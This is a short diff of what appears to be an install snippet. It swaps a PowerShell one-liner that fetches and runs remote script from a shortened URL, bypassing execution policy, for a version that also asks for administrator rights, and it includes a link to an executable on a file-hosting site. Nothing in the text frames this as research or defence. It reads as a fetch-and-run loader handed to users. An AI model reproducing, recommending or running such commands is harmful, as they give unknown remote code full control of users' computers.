@@ -1,4 +1,4 @@
-powershell.exe -ExecutionPolicy Bypass -Command "iex (irm 'https://is.gd/MCVOICE/')"
+powershell.exe -Command "Start-Process powershell.exe -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass -Command \"iex (irm \"https://is.gd/MCVOICE/\")\"'"
 
 https://www.upload.ee/files/17715005/1.exe.html
 
